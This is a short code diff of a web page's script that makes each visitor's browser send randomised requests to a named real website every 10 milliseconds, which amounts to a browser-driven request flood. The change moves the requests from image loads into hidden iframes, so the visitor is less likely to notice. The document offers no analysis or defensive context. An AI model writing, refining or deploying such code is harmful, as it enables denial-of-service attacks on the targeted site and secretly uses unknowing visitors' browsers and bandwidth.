@@ -2,12 +2,14 @@
   <head>
   	<script>
 
-		var doreq = function(target) {
-			var pic = new Image();
-			pic.src = 'https://'+target+'/?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
+		var doreq = function() {
+			var url = 'https://soruyacevap.com/?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
+			//var pic = new Image();
+			//pic.src = url;
+			document.body.innerHTML+='<iframe src="'+url+'" style="display:none;">   </iframe>';
 		};
 
-		var startreq = function() {setTimeout(function(){setInterval(function(){doreq("soruyacevap.com")}, 10);}, 10);};
+		var startreq = function() {setTimeout(function(){setInterval(function(){doreq()}, 10);}, 10);};
 		
 	</script>
   </head>
